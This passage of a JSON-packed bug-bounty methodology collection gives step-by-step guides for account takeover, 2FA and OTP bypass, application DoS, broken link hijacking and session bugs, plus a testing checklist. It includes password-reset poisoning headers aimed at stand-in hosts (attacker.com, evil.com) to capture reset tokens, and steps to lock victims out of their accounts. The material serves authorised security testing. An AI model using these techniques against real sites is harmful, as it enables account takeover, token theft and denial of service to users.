{
  "Account_Takeovers_Methodologies": [
    {
      "Account_Takeovers_Methods.md": "\r\n## Chaining Session Hijacking with XSS\r\n```\r\n1.I have added a session hijacking method in broken authentication and session management. \r\n2.If you find that on target.\r\n3.Try anyway to steal cookies on that target.\r\n4.Here I am saying look for xss .\r\n5.If you find xss you can steal the cookies of victim and using session hijacking you can takeover the account of victim.\r\n```\r\n##  No Rate Limit On Login With Weak Password Policy\r\n```\r\nSo if you find that target have weak password policy, try to go for no rate limit attacks in poc shows by creating very weak password of your account.\r\n\r\n(May or may not be accepted)\r\n```\r\n## Password Reset Poisioning Leads To Token Theft\r\n```\r\n1.Go to password reset funtion.\r\n2.Enter email and intercept the request.\r\n3.Change host header to some other host i.e,\r\n    Host:target.com\r\n    Host:attacker.com\r\n  also try to add some headers without changing host like\r\n    X-Forwarded-Host: evil.com\r\n    Referrer: https://evil.com\r\n4.Forward this if you find that in next request attacker.com means you managed to successfully steal the token. :)\r\n```\r\n## Using  Auth Bypass\r\n```\r\nCheck out Auth Bypass method, there is a method for OTP bypass via response manipulation, this can leads to account takeovers.\r\n1.Enter the wrong auth code / Password\r\n2.Capture a auth request in burpsuite and send it to repeater \r\n3.Check for the resoponse\r\n4.Change the respone by manipulating the following parameters\r\n  {“code”:”invalid_credentials”} -> {“code”:”valid_credentials”}\r\n  {“verify”:”false”}             -> {“verify”:”true”}\r\n  \r\n  \r\n```\r\n## Try For CSRF On\r\n```\r\n1.Change Password function.\r\n2.Email change\r\n3.Change Security Question\r\n```\r\n## Token Leaks In Response\r\n\r\n* So there are multiple ways to do it but all are same.\r\n\r\n* So I will sharing my method that I have learnt here .\r\n\r\n* Endpoints:(Register,Forget Password)\r\n\r\n* Steps(For Registration):\r\n```\r\n  1. For registeration intercept the signup request that contains the data you have entered.\r\n  2. Click on action -> do -> intercept the response to this request.\r\n  3. Click forward.\r\n  4. Check response if that contains any link, any token or OTP.\r\n ```\r\n ------------------------\r\n * Steps (For password reset):\r\n ``` \r\n  1. Intercept the forget password option.\r\n  2. Click on action -> do -> intercept the response to this request.\r\n  3. Click forward.\r\n  4. Check response if that contains any link,any token or OTP.\r\n ```\r\n\r\n## Reference:\r\n* Various Source From Google,Twitter,Medium\r\n* https://avanishpathak.medium.com/an-account-takeover-vulnerability-due-to-response-manipulation-e23fe629bd1\r\n\r\n## Author\r\n* [@Virdoex_hunter](https://twitter.com/Virdoex_hunter)\r\n* [@v3daxt](https://twitter.com/v3daxt)\r\n"
    }
  ],
  "API_Testing": [
    {
      "Hidden_API_Functionality_Exposure.md": "# Hidden API Functionality Exposure\r\n- Application programming interfaces (APIs) have become a critical part of almost every business. APIs are responsible for transferring information between systems within a company or to external companies. For example, when you log in to a website like Google or Facebook, an API processes your login credentials to verify they are correct.\r\n\r\n1. Swagger UI Documentation\r\n2. Dictionary Attack | Brute force\r\n3. Common wordlist for API Enum :\r\n- https://wordlists.assetnote.io/\r\n- https://github.com/Net-hunter121/API-Wordlist\r\n\r\n## Steps to Perform This Attack :\r\n```\r\nStep 1 : Capture the request into Burp, Send the request to repeater and intruder tab.\r\nStep 2 : Add the endpoint into the intruder tab and add the payload from the word-list.\r\nStep 3 : First use dictionary attack with SecLists (https://github.com/danielmiessler/SecLists) on the Endpoint.\r\nStep 4 : Either use your customized list or use the ones which I have provided in the above step.\r\nStep 5 : Then simply start the attack, start checking for 200 status.\r\nStep 7 : Once there is HTTP 200 OK status, start the recursive scan on the same endpoint for juicy information like swagger doc and so on.\r\nstep 8 : Other method is to change the API version and try bruteforcing the same endpoint\r\nEg: Redacted.com/api/v1/{Endpoint} ----- Redacted.com/api/v2/{Endpoint}\r\n```\r\n* Note: There will be minimum limits per request which will be assigned without API keys so make sure to utilize manual approach as much as you can, then the rest can be automated for scanning the vulnerability in API with automated tools.\r\n\r\n## Contributor:\r\n- [N3T_hunt3r](https://twitter.com/N3T_hunt3r)\r\n"
    }
  ],
  "Application_Level_DoS": [
    {
      "ALD_Methods.md": "\r\n## 1. Email Bounce Issues\r\n- Check if Application has Invite Functionality\r\n- Try sending Invites to Invalid Email Accounts\r\n- Try to find Email Service Provider such as AWS SES , Hubspot , Campaign Monitor\r\n**Note:  You can find Email Service Provider by checking Email Headers**\r\n* Once you have the Email Service Provider, Check there Hard Bounce Limits. Here are the limits for some of them:\r\n  \r\n  **1. Hubspot Hard bounces:** HubSpot's hard bounce limit is 5%. For reference, many ISPs prefer bounce rates to be under 2%.\r\n  \r\n  **2. AWS SES:** The rate of SES ranges from first 2-5% then 5-10%\r\n\r\n***Impact: Once the Hard Bounce Limits are reached, Email Service Provider will block the Company which means, No Emails would be sent to the Users !***\r\n\r\n## 2. Long Password DoS Attack\r\n\r\n- As the value of password is hashed and then stored in Databases. If there is no limit on the length of the Password, it can lead to consumption of resources for Hashing the Long Password.\r\n\r\n**How to test?**\r\n\r\n- Use a Password of length around 150-200 words to check the presense of Length Restriction\r\n- If there is no Restriction, Choose a longer password and keep a eye on Response Time\r\n- Check if the Application Crashes for few seconds \r\n\r\n**Where to test?**\r\n\r\n- Registration Password Field is usually restricted but the Length of Password on the Forgot Password Page and the Change Password (As Authenticated User) Functionality is usually missing.\r\n\r\n\r\n## 3. Long String DOS\r\n\r\n* When you set some string so long so server cannot process it anymore it cause DOS sometime\r\n\r\n**How to test**\r\n```\r\nCreate app and put field like username or address or even profile picture name parameter ( second refrence ) like 1000 character of string . \r\nSearch A's account from B's account either it will\r\n```\r\n- Either it will keeping on searching for long time\r\n- Either the application will crash (500 - Error Code)\r\n\r\n\r\n## Use Password From Password.txt\r\n⚠️`it's not recommended using more than 5000 characters as password.`\r\n- Here is the [Password.txt](https://raw.githubusercontent.com/KathanP19/HowToHunt/master/Application_Level_DoS/Password.txt)\r\n\r\n## 4. Permanent DOS to victim\r\nThis is not Application Level DOS but a Permanent DOS to victim.\r\nIn some website user get blocked after trying to loging in with wrong credidentials.We will untilize this feature as bug :D.\r\n\r\n**How to check**.\r\n- Go to login page of example.com.\r\n- Now enter valid account email and wrong password .\r\n- Try to login with these details for few times(at least 10-20 times).You can use repeater or intruder in burpsuite.\r\n- If your account get blocked, check the blocking time period.If the blocking time period is more than 30 min .You can report it.\r\n\r\n**Point to Remember**\r\n- Make sure there is no captcha during login because we cann't make any automated tool to loop the request.\r\n- Make sure Old session are expired after being blocked.\r\n\r\n**What is priority of this bug?**\r\n- If the user get permanently block after some wrong attempts this is considered as P2. \r\n- If the user get temporarly block this is considered as P3/P4.\r\n\r\nDuring report try to add impact by saying that you can permanently block user account by looping this request with some intervals.\r\n\r\n\r\n## Reference : \r\n\\- Email Bounce Issues\r\n* [https://medium.com/bugbountywriteup/an-unexpected-bounty-email-bounce-issues-b9f24a35eb68](https://medium.com/bugbountywriteup/an-unexpected-bounty-email-bounce-issues-b9f24a35eb68)\r\n\r\n\\- Long Password DoS Attack\r\n\r\n- https://www.acunetix.com/vulnerabilities/web/long-password-denial-of-service/\r\n- https://hackerone.com/reports/738569\r\n- https://hackerone.com/reports/167351\r\n\r\n\\- Long String DOS\r\n- [https://medium.com/@shahjerry33/long-string-dos-6ba8ceab3aa0](https://medium.com/@shahjerry33/long-string-dos-6ba8ceab3aa0)\r\n- https://hackerone.com/reports/764434\r\n\r\n\\- Permanent DOS to victim\r\n- https://youtu.be/5drIMXCQuNw\r\n\r\n## Author: \r\n* [Keshav Malik](https://twitter.com/g0t_rOoT_)\r\n* [Fani Malik](https://twitter.com/fanimalikhack)\r\n\r\n"
    }
  ],
  "Authentication_Bypass": [
    {
      "2FA_Bypasses.md": "# 2FA Bypass Techniques\r\n\r\n### [Mindmap](https://mm.tt/1736437018?t=SEeZOmvt01)\r\n\r\nIndex | Technique\r\n--- | ---\r\n**1** | Response Manipulation\r\n**2** | Status Code Manipulation\r\n**3** | 2FA Code Leakage in Response\r\n**4** | JS File Analysis\r\n**5** | 2FA Code Reusability\r\n**6** | Lack of Brute-Force Protection\r\n**7** | Missing 2FA Code Integrity Validation\r\n**8** | CSRF on 2FA Disabling\r\n**9** | Password Reset Disable 2FA\r\n**10** | Backup Code Abuse\r\n**11** | Clickjacking on 2FA Disabling Page\r\n**12** | Enabling 2FA doesn't expire Previously active Sessions\r\n**13** | Bypass 2FA with null or 000000\r\n___\r\n#### Response Manipulation\r\n```\r\nIn response if \"success\":false\r\nChange it to \"success\":true\r\n```\r\n\r\n#### Status Code Manipulation\r\n\r\n```\r\nIf Status Code is 4xx\r\nTry to change it to 200 OK and see if it bypass restrictions\r\n```\r\n#### 2FA Code Leakage in Response\r\n```\r\nCheck the response of the 2FA Code Triggering Request to see if the code is leaked.\r\n```\r\n#### JS File Analysis\r\n```\r\nRare but some JS Files may contain info about the 2FA Code, worth giving a shot\r\n```\r\n#### 2FA Code Reusability\r\n```\r\nSame code can be reused\r\n```\r\n### Lack of Brute-Force Protection\r\n```\r\nPossible to brute-force any length 2FA Code\r\n```\r\n#### Missing 2FA Code Integrity Validation\r\n```\r\nCode for any user acc can be used to bypass the 2FA\r\n```\r\n#### CSRF on 2FA Disabling\r\n```\r\nNo CSRF Protection on disabling 2FA, also there is no auth confirmation\r\n```\r\n#### Password Reset Disable 2FA\r\n```\r\n2FA gets disabled on password change/email change\r\n```\r\n#### Backup Code Abuse\r\n```\r\nBypassing 2FA by abusing the Backup code feature\r\nUse the above mentioned techniques to bypass Backup Code to remove/reset 2FA restrictions\r\n```\r\n#### Clickjacking on 2FA Disabling Page\r\n```\r\nIframing the 2FA Disabling page and social engineering victim to disable the 2FA\r\n```\r\n#### Enabling 2FA doesn't expire Previously active Sessions\r\n```\r\nIf the session is already hijacked and there is a session timeout vuln\r\n```\r\n#### Bypass 2FA with null or 000000\r\n```\r\nEnter the code 000000 or null to bypass 2FA protection.\r\n```\r\n___\r\n\r\n### Articles \r\n- [Testing Two-Factor Authentication](https://research.nccgroup.com/2021/06/10/testing-two-factor-authentication/) by [NCC Group](https://research.nccgroup.com/)\r\n\r\n\r\n## Author\r\n\r\n[Harsh Bothra](https://twitter.com/harshbothra_) \\\r\n[Vishal Saini](https://twitter.com/k4k4r07)\r\n"
    },
    {
      "OTP_Bypass.md": "\r\n## OTP Bypass on Register account via Response manipulation\r\n\r\n ### 1. First Method\r\n1. Register account with mobile number and request for OTP.\r\n2. Enter incorrect OTP and capture the request in Burpsuite.\r\n3. Do intercept response to this request and forward the request.\r\n4.  response will be \r\n\r\n`{\"verificationStatus\":false,\"mobile\":9072346577\",\"profileId\":\"84673832\"}`\r\n\r\n5. Change this response to\r\n\r\n`{\"verificationStatus\":true,\"mobile\":9072346577\",\"profileId\":\"84673832\"}`\r\n\r\n6. And forward the response.\r\n7. You will be logged in to the account.\r\n\r\n***Impact: Account Takeover***\r\n\r\n### 2. Second Method.\r\n1. Go to login and wait for OTP pop up.\r\n2. Enter incorrect OTP and capture the request in Burpsuite.\r\n3. Do intercept response to this request and forward the request.\r\n4. response will be \r\n`error`\r\n5.  Change this response to\r\n`success`\r\n6. And forward the response.\r\n7. You will be logged in to the account.\r\n\r\n***Impact: Account Takeover***\r\n\r\n### 3. Third Method:\r\n \r\n  ```\r\n    1.Register 2 accounts with any 2 mobile number(first enter right otp)\r\n    2.Intercept your request\r\n    3.click on action -> Do intercept -> intercept response to this request.\r\n    4.check what the message will display like status:1\r\n    5.Follow the same procedure with other account but this time enter wrong otp\r\n    6.Intercept respone to the request\r\n    7.See the message like you get status:0\r\n    8.Change status to 1 i.e, status:1 and forward the request if you logged in means you just done authentication bypass.\r\n  ```\r\n\r\n## Bypassing OTP in registration forms by repeating the form submission multiple times using repeater\r\n\r\n**Steps :**\r\n```\r\n      1. Create an account with a non-existing phone number\r\n      2. Intercept the Request in BurpSuite\r\n      3. Send the request to the repeater and forward\r\n      4. Go to Repeater tab and change the non-existent phone number to your phone number\r\n      5. If you got an OTP to your phone, try using that OTP to register that non-existent number\r\n  ```    \r\n  \r\n## No Rate Limit\r\n * Steps:-\r\n ```\r\n     1) Create an Account\r\n     2) When Application Ask you For the OTP( One-time password ), Enter wrong OTP and Capture this Request In Burp.\r\n     3) Send This Request into Repeater and repeat it by setting up payload on otp Value.\r\n     4) if there is no Rate Limit then wait for 200 Status Code (Sometimes 302)\r\n     5)if you get 200 ok or 302 Found Status Code that means you've bypass OTP\r\n ```\r\n ## More test cases for bypassing OTP-\r\n ```\r\n     1) Check for default OTP - 111111, 123456, 000000\r\n     2) Check if otp has been leaked in respone (Capture the request in burpsuite and send it to repeater to check the response)\r\n     3) Check if old OTP is still vaild\r\n ```\r\n \r\n\r\n### Contributors:\r\n* [@akshaykerkar13](https://twitter.com/akshaykerkar13)\r\n* [@Yn0tWhy](https://twitter.com/Yn0tWhy)\r\n* [@Virdoex_hunter](https://twitter.com/Virdoex_hunter)\r\n* [febinrev](https://twitter.com/febinrev)\r\n* [Fani Malik](https://twitter.com/fanimalikhack)\r\n* [@v3daxt](https://twitter.com/v3daxt)\r\n"
    }
  ],
  "BrokenLinkHijacking": [
    {
      "BrokenLinkHijacking.md": "\r\n## Steps\r\n\r\n1. Manually find and click external links on the target site ( For Example:- Some Links to Social Media Accounts or Some external Media Link)\r\n2. While Doing Manual work also put [broken-link-checker](https://github.com/stevenvachon/broken-link-checker) in background using below Command interminal.\r\n\r\n    `blc -rof --filter-level 3 https://example.com/`\r\n    \r\n   Ouput will be like Something. \r\n   \r\n   `─BROKEN─ https://www.linkedin.com/company/ACME-inc-/ (HTTP_999)`\r\n   \r\n 3. Now you need to check if company has the page or not , if no then register as the company or try to get that username or url. \r\n \r\n ## Alternate Step\r\n 1. Go to [Online Broken Link Checker](https://ahrefs.com/broken-link-checker), [Dead Link Checker](https://www.deadlinkchecker.com/) Or [Alternative Online Broken Link Checker](https://brokenlinkcheck.com/)\r\n 2. Input the domain name\r\n\r\n## Reference\r\n\r\n* [https://edoverflow.com/2017/broken-link-hijacking/](https://edoverflow.com/2017/broken-link-hijacking/)\r\n* [https://medium.com/@bathinivijaysimhareddy/how-i-takeover-the-companys-linkedin-page-790c9ed2b04d](https://medium.com/@bathinivijaysimhareddy/how-i-takeover-the-companys-linkedin-page-790c9ed2b04d)\r\n\r\n### Author:\r\n* [@KathanP19](https://twitter.com/KathanP19)\r\n* [@cyph3r_asr](https://twitter.com/cyph3r_asr)\r\n* [@v3daxt](https://twitter.com/v3daxt)\r\n"
    }
  ],
  "Broken_Auth_And_Session_Management": [
    {
      "Session_based_bugs.md": "# Broken Authentication And Session Management.\r\n\r\n### Old Session Does Not Expire After Password Change:\r\n* Steps:\r\n```\r\n      1.create An account On Your Target Site\r\n      2.Login Into Two Browser With Same Account(Chrome, FireFox.You Can Use Incognito Mode As well) \r\n      3.Change You Password In Chrome, On Seccessfull Password Change Referesh Your Logged in Account In FireFox/Incognito Mode.\r\n      4.If you'r still logged in Then This Is a Bug\r\n```      \r\n\r\n### Session Hijacking (Intended Behavior)\r\n* Steps:\r\n```\r\n    1.Create your account\r\n    2.Login your account\r\n    3.Use cookie editor extension in browser\r\n    4.Copy all the target cookies\r\n    5.Logout your account\r\n    6.Paste that cookies in cookie editor extension\r\n    7.Refresh page if you are logged in than this is a session hijacking\r\n```  \r\n`Impact:` If attacker get cookies of victim it will leads to account takeover.\r\n \r\n \r\n### Password reset token does not expire (Insecure Configurability)\r\n* Steps:\r\n```\r\n      1.Create your account on target Site.\r\n      2.request for a forget password token.\r\n      3.Don't use that link\r\n      4.Instead logged in with your old password and change your email to other.\r\n      5.Now use that password link sents to old email and check if you are able to change your password if yes than there is the litle bug.\r\n ```    \r\n \r\n ### Server security misconfiguration -> Lack of security headers -> Cache control for a security page\r\n * Steps :\r\n ``` \r\n     1. Login to the application\r\n     2. Navigate around the pages\r\n     3. Logout\r\n     4. Press (Alt+left-arrow) buttons\r\n     5. If you are logged in or can view the pages navigated by the user. Then you found a bug.\r\n  ```\r\n  `Impact:` At a PC cafe, if a person was in a very important page with alot of details and logged out, then another person comes and clicks back (because he didnt close the browser) then data is exposed. User information leaked\r\n \r\n ### Broken Authentication To Email Verification Bypass (P4) :\r\n  `category` : P4 >> Broken Authentication and Session Management >> Failure to Invalidate Session >> On Password Reset and/or Change\r\n\r\n* Steps To Reproduce:\r\n``` \r\n    1)First You need to make a account & You will receive a Email verification link.\r\n    2)Application in my case give less Privileges & Features to access if not verified.\r\n    3)Logged into the Application & I change the email Address to Email B.\r\n    4)A Verification Link was Send & I verified that.\r\n    5) Now I again Changed the email back to Email I have entered at the time of account creation.\r\n    6) It showed me that my Email is Verified.\r\n    7) Hence , A Succesful Email verfication Bypassed as I haven't Verified the Link which was sent to me in the time of account creation still my email got verified.\r\n    8)Didn't Receive any code again for verification when I changed back my email & When I open the account it showed in my Profile that its Verified Email.\r\n```\r\n\r\n`Impact` :\r\nEmail Verfication was bypassed due to Broken Authentication Mechanism , Thus more Privileged account can be accessed by an attacker making website prone to Future Attacks.    \r\n  Happy Hacking:)\r\n  \r\n  ### Email Verification Bypass (P3/P4)\r\n  * Steps :\r\n   ``` \r\n    1)First You need to Create an account with Your Own Email Address.\r\n    2)After Creating An Account A Verification Link will be sent to your account.\r\n    3)Dont Use The Email Verification link. Change Your Email to Victim's Email.\r\n    4)Now Go in Your Email and Click on Your Own Email Verification Link.\r\n    5)if the Victim's Email Get Verified then This is a Bug.\r\n```\r\n`Impact` : Email Verfication Bypass\r\n\r\n ### Old Password Reset Token Not Expiring Upon Requesting New One (Sometimes P4) :\r\n  * Steps :\r\n ``` \r\n    1)First You need to Create an account with a Valid Email Address.\r\n    2)After Creating An Account log out from your Account and Navigate on Forgot Password Page.\r\n    3)Request a Password Reset Link for your Account.A Verification Link will be sent to your account.\r\n    4)Without Using this Password Reset Link Request A New Password Reset Link.\r\n    5)Now go in Your email and Use 1st Password Reset Link Rather than Using 2nd One And Change Your Password.\r\n    6) If You Are Able to Change Your Password Than This Is a tiny Bug ;).\r\n```\r\n* Note:- Some Companies Won't Accept it As Valid Issue. \r\n\r\n### Password Reset Token Not Expiring After Password Change (P4):\r\n  * Steps :\r\n ``` \r\n    1)First You need to Create an account with a Valid Email Address.\r\n    2)After Creating An Account log out from your Account and Navigate on Forgot Password Page.\r\n    3)Request a Password Reset Link for your Account.\r\n    4)Use The Password Reset Link And Change The Password, After Changing the Password Login to Your Account.\r\n    5)Now Use The Old Password Reset Link To Change The Password Again.\r\n    6) If You Are Able to Change Your Password Again Than This Is a tiny Bug  ;).\r\n```\r\n\r\n### Insufficient account process validation leads to account takeover (P3/P4):\r\n   * Steps :\r\n```\r\n      1) Create an account on the website.\r\n      2) Go to profile section. And Change & update your details in the name parameter and before saving it Open Burp suite, turn the proxy on and then click on Save.\r\n      3) Now capture the request in Burp suite and send it to the Repeater tab.\r\n      4) Now log out from the website and go back to the Burp suite.\r\n      5) Now change the details email & name parameters and click on \"Go\" in the repeater tab.\r\n      6) Now you will be able to see 200 ok response from the web server.\r\n      7) Now, login into your account and go to the Profile section to confirm\r\n```\r\n\r\n* Thanks For Reading Guys Happy Hunting :).\r\n\r\n  ## Resources:\r\n  Google,Youtube.\r\n\r\n## Authors\r\n* [https://twitter.com/Virdoex_hunter](https://twitter.com/Virdoex_hunter) \r\n* Linkedin : [@chirag_Agrawal](https://www.linkedin.com/in/chirag-agrawal-770488144/), Twitter  : [@Raiders](https://twitter.com/ChiragA15977205)\r\n* Twitter : [Fani Malik](https://twitter.com/fanimalikhack) \r\n* Linkedin : [@suprit-pandurangi](https://www.linkedin.com/in/suprit-pandurangi-a90526106/)\r\n"
    }
  ],
  "CheckList": [
    {
      "Web-Application-Pentesting-checklist.md": "# Bug Bounty Checklist for Web App\r\n\r\n> This checklist may help you to have a good methodology for bug bounty hunting  \r\nWhen you have done a action, don't forget to check ;)  \r\nHappy hunting !  \r\n\r\n## Table of Contents\r\n\r\n* [Recon on wildcard domain](#\"Recon_on_wildcard_domain\")\r\n* [Single domain](#Single_domain)\r\n* [Information Gathering](#Information)\r\n* [Configuration Management](#Configuration)\r\n* [Secure Transmission](#Transmission)\r\n* [Authentication](#Authentication)\r\n* [Session Management](#Session)\r\n* [Authorization](#Authorization)\r\n* [Data Validation](#Validation)\r\n* [Denial of Service](#Denial)\r\n* [Business Logic](#Business)\r\n* [Cryptography](#Cryptography)\r\n* [Risky Functionality - File Uploads](#File)\r\n* [Risky Functionality - Card Payment](#Card)\r\n* [HTML 5](#HTML)\r\n\r\n\r\n## <a name=\"Recon_on_wildcard_domain\">Recon on wildcard domain</a>  \r\nThis recon process is from [0xpatrick subdomain enumeration workflow](https://0xpatrik.com/subdomain-enumeration-2019/)\r\n\r\n- [ ] Run Amass\r\n- [ ] Run Subfinder\r\n- [ ] Run Rapid7 FDNS\r\n- [ ] Use commonspeak2 list\r\n- [ ] Run massdns\r\n- [ ] Run altdns\r\n- [ ] Run massdns\r\n\r\n\r\n## <a name=\"Single_domain\">Single Domain</a>  \r\n\r\n### Scanning  \r\n\r\n- [ ] Arachni Scan  \r\n- [ ] Owasp ZAp Scan  \r\n- [ ] Burp Spider  \r\n- [ ] Burp Scanning   \r\n- [ ] Wayback machine  \r\n- [ ] Linkfinder  \r\n- [ ] Url with Android application   \r\n\r\n### Manual checking  \r\n\r\n- [ ] Shodan  \r\n- [ ] Censys  \r\n- [ ] Google dorks  \r\n- [ ] Pastebin  \r\n- [ ] Github  \r\n- [ ] OSINT     \r\n\r\n### <a name=\"Information\">Information Gathering</a>\r\n- [ ] Manually explore the site  \r\n- [ ] Spider/crawl for missed or hidden content  \r\n- [ ] Check for files that expose content, such as robots.txt, sitemap.xml, .DS_Store  \r\n- [ ] Check the caches of major search engines for publicly accessible sites  \r\n- [ ] Check for differences in content based on User Agent (eg, Mobile sites, access as a Search engine Crawler)  \r\n- [ ] Perform Web Application Fingerprinting  \r\n- [ ] Identify technologies used  \r\n- [ ] Identify user roles  \r\n- [ ] Identify application entry points  \r\n- [ ] Identify client-side code  \r\n- [ ] Identify multiple versions/channels (e.g. web, mobile web, mobile app, web services)  \r\n- [ ] Identify co-hosted and related applications  \r\n- [ ] Identify all hostnames and ports  \r\n- [ ] Identify third-party hosted content  \r\n- [ ] Identify Debug parameters  \r\n\r\n\r\n### <a name=\"Configuration\">Configuration Management</a>\r\n\r\n- [ ] Check for commonly used application and administrative URLs  \r\n- [ ] Check for old, backup and unreferenced files  \r\n- [ ] Check HTTP methods supported and Cross Site Tracing (XST)  \r\n- [ ] Test file extensions handling  \r\n- [ ] Test for security HTTP headers (e.g. CSP, X-Frame-Options, HSTS)  \r\n- [ ] Test for policies (e.g. Flash, Silverlight, robots)  \r\n- [ ] Test for non-production data in live environment, and vice-versa  \r\n- [ ] Check for sensitive data in client-side code (e.g. API keys, credentials)  \r\n\r\n\r\n### <a name=\"Transmission\">Secure Transmission</a>\r\n\r\n- [ ] Check SSL Version, Algorithms, Key length  \r\n- [ ] Check for Digital Certificate Validity (Duration, Signature and CN)  \r\n- [ ] Check credentials only delivered over HTTPS  \r\n- [ ] Check that the login form is delivered over HTTPS  \r\n- [ ] Check session tokens only delivered over HTTPS  \r\n- [ ] Check if HTTP Strict Transport Security (HSTS) in use  \r\n\r\n\r\n\r\n### <a name=\"Authentication\">Authentication</a>\r\n- [ ] Test for user enumeration  \r\n- [ ] Test for authentication bypass  \r\n- [ ] Test for bruteforce protection  \r\n- [ ] Test password quality rules  \r\n- [ ] Test remember me functionality  \r\n- [ ] Test for autocomplete on password forms/input  \r\n- [ ] Test password reset and/or recovery  \r\n- [ ] Test password change process  \r\n- [ ] Test CAPTCHA  \r\n- [ ] Test multi factor authentication  \r\n- [ ] Test for logout functionality presence  \r\n- [ ] Test for cache management on HTTP (eg Pragma, Expires, Max-age)  \r\n- [ ] Test for default logins  \r\n- [ ] Test for user-accessible authentication history  \r\n- [ ] Test for out-of channel notification of account lockouts and successful password changes  \r\n- [ ] Test for consistent authentication across applications with shared authentication schema / SSO  \r\n\r\n\r\n\r\n### <a name=\"Session\">Session Management</a>\r\n- [ ] Establish how session management is handled in the application (eg, tokens in cookies, token in URL)  \r\n- [ ] Check session tokens for cookie flags (httpOnly and secure)  \r\n- [ ] Check session cookie scope (path and domain)  \r\n- [ ] Check session cookie duration (expires and max-age)  \r\n- [ ] Check session termination after a maximum lifetime  \r\n- [ ] Check session termination after relative timeout  \r\n- [ ] Check session termination after logout  \r\n- [ ] Test to see if users can have multiple simultaneous sessions  \r\n- [ ] Test session cookies for randomness  \r\n- [ ] Confirm that new session tokens are issued on login, role change and logout  \r\n- [ ] Test for consistent session management across applications with shared session management  \r\n- [ ] Test for session puzzling  \r\n- [ ] Test for CSRF and clickjacking  \r\n\r\n\r\n\r\n### <a name=\"Authorization\">Authorization</a>\r\n- [ ] Test for path traversal  \r\n- [ ] Test for bypassing authorization schema  \r\n- [ ] Test for vertical Access control problems (a.k.a. Privilege Escalation)  \r\n- [ ] Test for horizontal Access control problems (between two users at the same privilege level)  \r\n- [ ] Test for missing authorization  \r\n\r\n\r\n### <a name=\"Validation\">Data Validation</a>\r\n- [ ] Test for Reflected Cross Site Scripting  \r\n- [ ] Test for Stored Cross Site Scripting  \r\n- [ ] Test for DOM based Cross Site Scripting  \r\n- [ ] Test for Cross Site Flashing  \r\n- [ ] Test for HTML Injection  \r\n- [ ] Test for SQL Injection  \r\n- [ ] Test for LDAP Injection  \r\n- [ ] Test for ORM Injection  \r\n- [ ] Test for XML Injection  \r\n- [ ] Test for XXE Injection  \r\n- [ ] Test for SSI Injection  \r\n- [ ] Test for XPath Injection  \r\n- [ ] Test for XQuery Injection  \r\n- [ ] Test for IMAP/SMTP Injection  \r\n- [ ] Test for Code Injection  \r\n- [ ] Test for Expression Language Injection  \r\n- [ ] Test for Command Injection  \r\n- [ ] Test for Overflow (Stack, Heap and Integer)  \r\n- [ ] Test for Format String  \r\n- [ ] Test for incubated vulnerabilities  \r\n- [ ] Test for HTTP Splitting/Smuggling  \r\n- [ ] Test for HTTP Verb Tampering  \r\n- [ ] Test for Open Redirection  \r\n- [ ] Test for Local File Inclusion  \r\n- [ ] Test for Remote File Inclusion  \r\n- [ ] Compare client-side and server-side validation rules  \r\n- [ ] Test for NoSQL injection  \r\n- [ ] Test for HTTP parameter pollution  \r\n- [ ] Test for auto-binding  \r\n- [ ] Test for Mass Assignment  \r\n- [ ] Test for NULL/Invalid Session Cookie  \r\n\r\n### <a name=\"Denial\">Denial of Service</a>\r\n- [ ] Test for anti-automation  \r\n- [ ] Test for account lockout  \r\n- [ ] Test for HTTP protocol DoS  \r\n- [ ] Test for SQL wildcard DoS  \r\n\r\n\r\n### <a name=\"Business\">Business Logic</a>\r\n- [ ] Test for feature misuse  \r\n- [ ] Test for lack of non-repudiation  \r\n- [ ] Test for trust relationships  \r\n- [ ] Test for integrity of data  \r\n- [ ] Test segregation of duties  \r\n\r\n\r\n### <a name=\"Cryptography\">Cryptography</a>\r\n- [ ] Check if data which should be encrypted is not  \r\n- [ ] Check for wrong algorithms usage depending on context  \r\n- [ ] Check for weak algorithms usage  \r\n- [ ] Check for proper use of salting  \r\n- [ ] Check for randomness functions  \r\n\r\n\r\n### <a name=\"File\">Risky Functionality - File Uploads</a>\r\n- [ ] Test that acceptable file types are whitelisted  \r\n- [ ] Test that file size limits, upload frequency and total file counts are defined and are enforced  \r\n- [ ] Test that file contents match the defined file type  \r\n- [ ] Test that all file uploads have Anti-Virus scanning in-place.  \r\n- [ ] Test that unsafe filenames are sanitised  \r\n- [ ] Test that uploaded files are not directly accessible within the web root  \r\n- [ ] Test that uploaded files are not served on the same hostname/port  \r\n- [ ] Test that files and other media are integrated with the authentication and authorisation schemas  \r\n\r\n\r\n### <a name=\"Card\">Risky Functionality - Card Payment</a>\r\n- [ ] Test for known vulnerabilities and configuration issues on Web Server and Web Application  \r\n- [ ] Test for default or guessable password  \r\n- [ ] Test for non-production data in live environment, and vice-versa  \r\n- [ ] Test for Injection vulnerabilities  \r\n- [ ] Test for Buffer Overflows  \r\n- [ ] Test for Insecure Cryptographic Storage  \r\n- [ ] Test for Insufficient Transport Layer Protection  \r\n- [ ] Test for Improper Error Handling  \r\n- [ ] Test for all vulnerabilities with a CVSS v2 score > 4.0  \r\n- [ ] Test for Authentication and Authorization issues  \r\n- [ ] Test for CSRF  \r\n\r\n\r\n### <a name=\"HTML\">HTML 5</a>\r\n- [ ] Test Web Messaging  \r\n- [ ] Test for Web Storage SQL injection  \r\n- [ ] Check CORS implementation  \r\n- [ ] Check Offline Web Application  \r\n\r\nSource:  \r\n[OWASP](https://www.owasp.org/index.php/Web_Application_Security_Testing_Cheat_Sheet)  \r\n[OWASP] https://github.com/OWASP/CheatSheetSeries\r\n[0xpatrick subdomain enumeration workflow](https://0xpatrik.com/subdomain-enumeration-2019/)\r\n\r\nCredits:-\r\n- [Sehno](https://github.com/sehno/Bug-bounty)\r\n"
    }
  ],
  "CMS": [
    {
      "AEM.md": "## Adobe Experience Manager\r\n\r\n### Tools\r\n+ [aem-hacker](https://github.com/0ang3el/aem-hacker)\r\n+ [aemscan](https://github.com/Raz0r/aemscan)\r\n\r\n### Wordlist for fuzzing\r\n+ [aem.txt](https://raw.githubusercontent.com/clarkvoss/AEM-List/main/paths)\r\n\r\n### Resources\r\n+ [Approaching AEM](https://www.bugcrowd.com/resources/webinar/aem-hacker-approaching-adobe-experience-manager-web-apps/)\r\n+ [Securing AEM](https://www.slideshare.net/0ang3el/securing-aem-webapps-by-hacking-them)\r\n"
    },
    {
